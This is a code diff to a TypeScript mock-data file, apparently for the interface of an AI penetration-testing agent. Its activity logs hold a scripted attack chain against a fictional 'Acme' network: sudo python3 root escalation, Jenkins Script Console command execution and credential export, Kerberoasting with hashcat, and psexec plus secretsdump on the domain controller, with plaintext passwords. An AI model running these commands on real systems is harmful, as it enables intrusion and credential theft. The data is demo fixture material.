-    detail: "www-data@dmz-web01，且第二网卡 10.10.10.x —— 已进入 DMZ 且贴内网。",
+    detail: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
   },
   {
     seq: 337,
@@ -2258,6 +2530,17 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t7d",
     summary: "report_finding(Deserialization RCE, high)",
+    detail: JSON.stringify(
+      {
+        vulnclass: "Deserialization RCE",
+        severity: "high",
+        summary: "shop.acme.com Fastjson 1.2.24 反序列化远程命令执行",
+        intent_id: "i7",
+        evidence: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 338,
@@ -2290,6 +2573,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8a",
     summary: "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head",
+    detail: JSON.stringify(
+      { command: "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head" },
+      null,
+      2,
+    ),
   },
   {
     seq: 342,
@@ -2300,7 +2588,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8a",
     summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
-    detail: "sudo 白名单里 python3 且免密 —— 直接可提权。",
+    detail: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
   },
   {
     seq: 343,
@@ -2311,6 +2599,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8b",
     summary: "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'",
+    detail: JSON.stringify({ command: "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'" }, null, 2),
   },
   {
     seq: 344,
@@ -2321,7 +2610,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8b",
     summary: "uid=0(root) gid=0(root) groups=0(root)",
-    detail: "已提权 root。",
+    detail: "uid=0(root) gid=0(root) groups=0(root)",
   },
   {
     seq: 345,
@@ -2332,6 +2621,17 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t8c",
     summary: "report_finding(Privilege Escalation, high)",
+    detail: JSON.stringify(
+      {
+        vulnclass: "Privilege Escalation",
+        severity: "high",
+        summary: "DMZ 立足点 sudo NOPASSWD 错配可本地提权 root",
+        intent_id: "i8",
+        evidence: "uid=0(root) gid=0(root) groups=0(root)",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 346,
@@ -2364,6 +2664,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t9a",
     summary: "./fscan -h 10.10.10.0/24 -np -nobr 2>&1 | tail -n 30",
+    detail: JSON.stringify({ command: "./fscan -h 10.10.10.0/24 -np -nobr 2>&1 | tail -n 30" }, null, 2),
   },
   {
     seq: 352,
@@ -2374,7 +2675,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t9a",
     summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
-    detail: "圈定域控 DC01、文件服务器 FS01、内部 Jenkins。",
+    detail: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
   },
   {
     seq: 353,
@@ -2407,6 +2708,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t10a",
     summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'",
+    detail: JSON.stringify({ command: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'" }, null, 2),
   },
   {
     seq: 362,
@@ -2417,7 +2719,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t10a",
     summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 认证失败",
-    detail: "FS01 上 sa 口令复用成功且有管理员权限；DC01 不通。",
+    detail: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 认证失败",
   },
   {
     seq: 363,
@@ -2446,6 +2748,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11a",
     summary: "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
+    detail: JSON.stringify(
+      { command: "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'" },
+      null,
+      2,
+    ),
   },
   {
     seq: 372,
@@ -2456,7 +2763,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11a",
     summary: "200",
-    detail: "Script Console 无需登录即可访问。",
+    detail: "200",
   },
   {
     seq: 373,
@@ -2467,6 +2774,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11b",
     summary: "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText",
+    detail: JSON.stringify(
+      { command: "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText" },
+      null,
+      2,
+    ),
   },
   {
     seq: 374,
@@ -2477,7 +2789,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11b",
     summary: "nt authority\\system",
-    detail: "Groovy 以 SYSTEM 权限执行。",
+    detail: "nt authority\\system",
   },
   {
     seq: 375,
@@ -2488,6 +2800,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11c",
     summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # 导出 Jenkins 凭据库",
+    detail: JSON.stringify(
+      { command: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # 导出 Jenkins 凭据库" },
+      null,
+      2,
+    ),
   },
   {
     seq: 376,
@@ -2498,7 +2815,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11c",
     summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
-    detail: "两个域服务账号明文口令导出。",
+    detail: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
   },
   {
     seq: 377,
@@ -2509,6 +2826,17 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t11d",
     summary: "report_finding(Unauthenticated RCE, high)",
+    detail: JSON.stringify(
+      {
+        vulnclass: "Unauthenticated RCE",
+        severity: "high",
+        summary: "内部 Jenkins 未授权 Script Console 远程命令执行",
+        intent_id: "i11",
+        evidence: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 378,
@@ -2541,6 +2869,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12a",
     summary: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request",
+    detail: JSON.stringify(
+      { command: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request" },
+      null,
+      2,
+    ),
   },
   {
     seq: 382,
@@ -2551,7 +2884,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12a",
     summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
-    detail: "拿到 svc_sql 的 TGS 票据（Kerberos RC4）。",
+    detail: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
   },
   {
     seq: 383,
@@ -2562,6 +2895,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12b",
     summary: "hashcat -m 13100 tgs.hash rockyou.txt --force",
+    detail: JSON.stringify({ command: "hashcat -m 13100 tgs.hash rockyou.txt --force" }, null, 2),
   },
   {
     seq: 384,
@@ -2572,7 +2906,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12b",
     summary: "$krb5tgs$23$*svc_sql$...:Sql@2020",
-    detail: "8 分钟破出口令 Sql@2020。",
+    detail: "$krb5tgs$23$*svc_sql$...:Sql@2020",
   },
   {
     seq: 385,
@@ -2583,6 +2917,17 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t12c",
     summary: "report_finding(Kerberoasting, high)",
+    detail: JSON.stringify(
+      {
+        vulnclass: "Kerberoasting",
+        severity: "high",
+        summary: "域服务账号 svc_sql 可被 Kerberoast 且口令弱",
+        intent_id: "i12",
+        evidence: "$krb5tgs$23$*svc_sql$...:Sql@2020",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 386,
@@ -2615,6 +2960,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13a",
     summary: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10",
+    detail: JSON.stringify(
+      { command: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10" },
+      null,
+      2,
+    ),
   },
   {
     seq: 392,
@@ -2625,7 +2975,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13a",
     summary: "ACME\\Administrator\nACME\\svc_deploy",
-    detail: "svc_deploy 是 Domain Admins 成员。",
+    detail: "ACME\\Administrator\nACME\\svc_deploy",
   },
   {
     seq: 393,
@@ -2636,6 +2986,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13b",
     summary: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10",
+    detail: JSON.stringify({ command: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10" }, null, 2),
   },
   {
     seq: 394,
@@ -2646,7 +2997,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13b",
     summary: "C:\\Windows\\system32> whoami\nnt authority\\system",
-    detail: "以 SYSTEM 身份登录域控 DC01。",
+    detail: "C:\\Windows\\system32> whoami\nnt authority\\system",
   },
   {
     seq: 395,
@@ -2657,6 +3008,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13c",
     summary: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc",
+    detail: JSON.stringify(
+      { command: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc" },
+      null,
+      2,
+    ),
   },
   {
     seq: 396,
@@ -2667,7 +3023,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13c",
     summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
-    detail: "全域 NTLM 哈希导出（含 krbtgt），可制作黄金票据持久控制。",
+    detail: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
   },
   {
     seq: 397,
@@ -2678,6 +3034,17 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t13d",
     summary: "report_finding(Domain Compromise, high)",
+    detail: JSON.stringify(
+      {
+        vulnclass: "Domain Compromise",
+        severity: "high",
+        summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成",
+        intent_id: "i13",
+        evidence: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 398,
@@ -3579,7 +3946,38 @@ export const conversations: Conversation[] = [
     created_at: T("2026-07-25T15:45:00Z"),
     updated_at: T("2026-07-26T00:25:00Z"),
   },
+  {
+    id: 4,
+    agent_key: "mainagent",
+    title: "Acme 已有证据整理 · 并行执行示例",
+    llm_profile_id: 1,
+    created_at: T("2026-07-26T08:10:00Z"),
+    updated_at: T("2026-07-26T08:10:12Z"),
+  },
 ];
+
+// A local report preview supplies long output without issuing demo network requests.
+const reportPreviewOutput = Array.from({ length: 64 }, (_, index) =>
+  JSON.stringify({
+    id: `ev-${String(index + 1).padStart(3, "0")}`,
+    project: "Acme",
+    source: "saved-http-response",
+    method: "GET",
+    path: index % 2 ? "/api/health" : "/",
+    status: 200,
+    note: "已有记录：保留响应状态、证据索引与待验证项；本次整理未发送新的网络请求。",
+  }),
+).join("\n");
+
+const previewWorkingDir = "/preview/sessions/conv-4";
+const previewSummaryBefore = "# 本地证据摘要\n\n状态：待整理\n记录数量：64\n";
+const previewSummaryAfter = "# 本地证据摘要\n\n状态：已整理\n记录数量：64\n缺失文件：optional-notes.md\n";
+const previewSummaryFinal = previewSummaryAfter.replace("记录数量：64", "记录数量：64（已核对）");
+export const toolPreviewFiles: Record<string, string> = {
+  "reports/evidence-log.jsonl": `${reportPreviewOutput}\n${JSON.stringify({ id: "ev-065", note: "后续新增记录，仅出现在当前文件视图" })}\n`,
+  "reports/summary.md": previewSummaryFinal,
+  "reports/README.md": "# 整理说明\n\n仅使用已保存的本地证据。\n",
+};
 
 export const conversationMessages: Record<number, Activity[]> = {
   1: [
@@ -3599,6 +3997,11 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c11",
       summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'",
+      detail: JSON.stringify(
+        { command: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'" },
+        null,
+        2,
+      ),
     },
     {
       seq: 4,
@@ -3608,7 +4011,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c11",
       summary: "element-ui\ncsrf",
-      detail: "Element-UI 后台，有 CSRF token 但无验证码。",
+      detail: "element-ui\ncsrf",
     },
     {
       seq: 5,
@@ -3619,6 +4022,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool_use_id: "c12",
       summary:
         "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done",
+      detail: JSON.stringify(
+        {
+          command:
+            "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done",
+        },
+        null,
+        2,
+      ),
     },
     {
       seq: 6,
@@ -3627,8 +4038,8 @@ export const conversationMessages: Record<number, Activity[]> = {
       kind: "tool_result",
       tool: "bash",
       tool_use_id: "c12",
-      summary: "401\\n401\\n401\\n401\\n401",
-      detail: "连续 5 次无锁定/无验证码 → 无速率限制，可爆破。",
+      summary: "401\n401\n401\n401\n401",
+      detail: "401\n401\n401\n401\n401",
     },
     {
       seq: 7,
@@ -3671,6 +4082,11 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c21",
       summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'",
+      detail: JSON.stringify(
+        { command: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'" },
+        null,
+        2,
+      ),
     },
     {
       seq: 4,
@@ -3680,7 +4096,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c21",
       summary: '{ "id": 42, "role": "user" }',
-      detail: "普通用户 token 可用。",
+      detail: '{ "id": 42, "role": "user" }',
     },
     {
       seq: 5,
@@ -3690,6 +4106,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c22",
       summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法",
+      detail: JSON.stringify({ command: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法" }, null, 2),
     },
     {
       seq: 6,
@@ -3699,7 +4116,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c22",
       summary: '{"alg":"HS256","typ":"JWT"}',
-      detail: "HS256 对称签名，若密钥弱可离线爆破伪造。",
+      detail: '{"alg":"HS256","typ":"JWT"}',
     },
     {
       seq: 7,
@@ -3748,6 +4165,11 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c31",
       summary: "proxychains curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
+      detail: JSON.stringify(
+        { command: "proxychains curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'" },
+        null,
+        2,
+      ),
     },
     {
       seq: 6,
@@ -3757,7 +4179,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c31",
       summary: "200",
-      detail: "/script 可直接访问，无需认证。",
+      detail: "200",
     },
     {
       seq: 7,
@@ -3790,6 +4212,137 @@ export const conversationMessages: Record<number, Activity[]> = {
       kind: "text",
       summary:
         "完整杀伤链：\n1. .git 泄露→源码白盒+硬编码凭据\n2. shop Fastjson RCE→DMZ 反弹 shell\n3. sudo 提权→root 立足\n4. 内网发现→DC01/FS01/Jenkins\n5. Jenkins 未授权→导出域凭据 svc_deploy\n6. Kerberoasting→破解 svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump 全域哈希\n\n四个目标全部达成，17 个发现（7 高/4 中/2 低 + 8 内网链路）。",
+    },
+  ],
+  4: [
+    {
+      seq: 1,
+      worker: "user",
+      ts: T("2026-07-26T08:10:00Z"),
+      kind: "user",
+      summary: "整理 Acme 已有证据，先看本地记录和运行环境，不要重新发起测试。",
+    },
+    {
+      seq: 2,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:01Z"),
+      kind: "thinking",
+      summary: "读取现有证据日志，同时确认本地运行时和可选说明文件。整理仅依据保存的记录。",
+    },
+    {
+      seq: 3,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:02Z"),
+      kind: "text",
+      summary: "我会并行读取证据日志、检查 Python 版本与可选说明，再汇总可用记录。",
+    },
+    {
+      seq: 4,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:03Z"),
+      kind: "tool_use",
+      tool: "Read",
+      tool_use_id: "report-read-log",
+      summary: '{"path":"reports/evidence-log.jsonl"}',
+      detail: JSON.stringify({ path: "reports/evidence-log.jsonl" }, null, 2),
+    },
+    {
+      seq: 5,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:03Z"),
+      kind: "tool_use",
+      tool: "bash",
+      tool_use_id: "report-python-version",
+      summary: "python3 --version",
+      detail: JSON.stringify({ command: "python3 --version" }, null, 2),
+    },
+    {
+      seq: 6,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:03Z"),
+      kind: "tool_use",
+      tool: "Read",
+      tool_use_id: "report-read-optional",
+      summary: '{"path":"reports/optional-notes.md"}',
+      detail: JSON.stringify({ path: "reports/optional-notes.md" }, null, 2),
+    },
+    // Calls finish out of order; IDs, rather than row adjacency, pair the results.
+    {
+      seq: 7,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:05Z"),
+      kind: "tool_result",
+      tool: "bash",
+      tool_use_id: "report-python-version",
+      summary: "Python 3.12.4",
+      detail: "Python 3.12.4\n",
+    },
+    {
+      seq: 8,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:08Z"),
+      kind: "tool_result",
+      tool: "Read",
+      tool_use_id: "report-read-log",
+      summary: reportPreviewOutput.split("\n")[0],
+      detail: reportPreviewOutput.split("\n").map((line, index) => `${String(index + 1).padStart(6)}\t${line}`).join("\n"),
+      metadata: { tool_artifact: { version: 1, kind: "read", working_dir: previewWorkingDir, path: `${previewWorkingDir}/reports/evidence-log.jsonl`, line_start: 1, line_end: 64 } },
+    },
+    {
+      seq: 9,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:09Z"),
+      kind: "tool_result",
+      tool: "Read",
+      tool_use_id: "report-read-optional",
+      is_error: true,
+      summary: "ENOENT: no such file or directory, open 'reports/optional-notes.md'",
+      detail: "ENOENT: no such file or directory, open 'reports/optional-notes.md'\n",
+    },
+    {
+      seq: 10,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:09Z"),
+      kind: "tool_use",
+      tool: "Grep",
+      tool_use_id: "report-search-evidence",
+      summary: '{"pattern":"evidence","path":"reports/"}',
+      detail: JSON.stringify({ pattern: "evidence", path: "reports/" }),
+    },
+    {
+      seq: 11,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:10Z"),
+      kind: "tool_result",
+      tool: "Grep",
+      tool_use_id: "report-search-evidence",
+      summary: "搜索完成，已定位证据日志。",
+      detail: "reports/evidence-log.jsonl:1: 已保存证据\n",
+      metadata: { tool_artifact: { version: 1, kind: "search", working_dir: previewWorkingDir, path: `${previewWorkingDir}/reports`, query: "evidence", entries: [{ path: `${previewWorkingDir}/reports/evidence-log.jsonl`, line: 1, text: "已保存证据" }] } },
+    },
+    {
+      seq: 12,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:10Z"),
+      kind: "text",
+      summary: "证据日志和运行时已读到；可选说明文件缺失，我会在结果中保留这项说明。",
+    },
+    ...([
+      ["Edit", { file_path: "reports/summary.md", old_string: previewSummaryBefore, new_string: previewSummaryAfter }, { version: 1, kind: "change", working_dir: previewWorkingDir, path: `${previewWorkingDir}/reports/summary.md`, operation: "edit", before_exists: true, snapshot_available: true, before: previewSummaryBefore, after: previewSummaryAfter }],
+      ["MultiEdit", { file_path: "reports/summary.md", edits: [{ old_string: "记录数量：64", new_string: "记录数量：64（已核对）" }] }, { version: 1, kind: "change", working_dir: previewWorkingDir, path: `${previewWorkingDir}/reports/summary.md`, operation: "edit", before_exists: true, snapshot_available: true, before: previewSummaryAfter, after: previewSummaryFinal }],
+      ["Write", { file_path: "reports/README.md", content: toolPreviewFiles["reports/README.md"] }, { version: 1, kind: "change", working_dir: previewWorkingDir, path: `${previewWorkingDir}/reports/README.md`, operation: "create", before_exists: false, snapshot_available: true, before: "", after: toolPreviewFiles["reports/README.md"] }],
+      ["Glob", { pattern: "reports/*.md" }, { version: 1, kind: "search", working_dir: previewWorkingDir, path: previewWorkingDir, query: "reports/*.md", entries: [{ path: `${previewWorkingDir}/reports/summary.md` }, { path: `${previewWorkingDir}/reports/README.md` }] }],
+    ] as const).flatMap(([tool, input, artifact], index): Activity[] => [
+      { seq: 13 + index * 2, worker: "mainagent", ts: T(`2026-07-26T08:10:${11 + index * 2}Z`), kind: "tool_use", tool, tool_use_id: `preview-file-${index}`, summary: JSON.stringify(input), detail: JSON.stringify(input) },
+      { seq: 14 + index * 2, worker: "mainagent", ts: T(`2026-07-26T08:10:${12 + index * 2}Z`), kind: "tool_result", tool, tool_use_id: `preview-file-${index}`, summary: tool === "Glob" ? "找到 2 个文件" : "文件已保存", metadata: { tool_artifact: structuredClone(artifact) as ToolArtifact } },
+    ]),
+    {
+      seq: 21,
+      worker: "mainagent",
+      ts: T("2026-07-26T08:10:20Z"),
+      kind: "result",
+      summary:
+        "已整理 64 条本地证据记录。\n\n- 证据来源：`reports/evidence-log.jsonl`\n- 本地 Python：3.12.4\n- 可选说明：`reports/optional-notes.md` 缺失，未纳入本次整理\n\n已更新摘要并新增整理说明；未向目标发送请求。",
     },
   ],
 };
